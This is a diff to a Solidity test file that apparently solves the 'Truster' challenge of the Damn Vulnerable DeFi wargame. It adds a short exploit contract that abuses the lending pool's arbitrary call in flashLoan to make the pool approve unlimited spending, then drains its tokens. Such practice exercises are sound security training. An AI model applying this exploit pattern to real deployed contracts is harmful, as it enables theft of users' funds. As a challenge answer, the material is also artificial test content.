@@ -5,6 +5,14 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
+
+contract Exp {
+    constructor(DamnValuableToken token, TrusterLenderPool victim, address recovery) {
+        victim.flashLoan(0, address(this), address(token), abi.encodeCall(ERC20.approve, (address(this), type(uint256).max)));
+        token.transferFrom(address(victim), recovery, token.balanceOf(address(victim)));
+    }
+}
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -51,7 +59,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        new Exp(token, pool, recovery);
     }
 
     /**
